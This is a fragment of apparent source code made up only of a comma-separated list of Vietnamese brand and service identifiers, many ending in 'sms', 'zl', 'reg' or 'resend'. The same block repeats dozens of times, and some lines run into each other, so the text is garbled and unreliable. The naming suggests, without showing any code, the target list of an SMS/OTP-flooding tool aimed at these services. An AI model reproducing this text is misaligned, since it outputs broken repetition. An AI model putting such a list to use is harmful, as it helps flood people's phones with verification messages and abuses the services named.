    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,     tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn,tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,    tv360, beautybox, xanhsmzl, galaxyplay, myviettel, fptshop, sapo, reebok, shine,
    vieon,thefaceshop, bestexpress, oreka, acfc, pantio, winny, befood,
    myviettel, fptshop, sapo, reebok, shine, hasaki, emart, ahamove, fahasa, sablanca,
    foodhubzl, pantioresend, vttelecom, vinwonders, vietair,
    mioto, pharmartsms, medigosms, avakids, medigozl,
    pharmartzl, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
    vuihoc, mainguyen, phongtro123, chothuephongtro, bds123, vnsc,
    bibomart, sbiz, thieuhoa, goldenspoonszl, dchic, guardian, hoangphuc, trungsoncaresms,
    leflair, vayvnd, bibabo, mocha35, xanhsm2, foodmapzl, lixibox, boshop, sapporopremiumbeer,
    innisfree, goldenspoonssms, aeoneshop, chothuenha, gas24h,
    goldenspoonssmsresend, zl188, thuecanho123, goldenspoonszlresend,
    alothuocsi, alothuocsi2, foodmapsms, trungsoncarezl, jollibee, beautyfull,
    kkfashion, galle, minhshop, formartvn, ddmevabe, ghtkreg, pcspostreg, liena, gofood, pasgo, vietloan,
    mocha, sigo, mamanbebe, tatmart, hacom, xanhsmreg,
    viettelpost, ghtk, pcspost, vsports, mrtho,
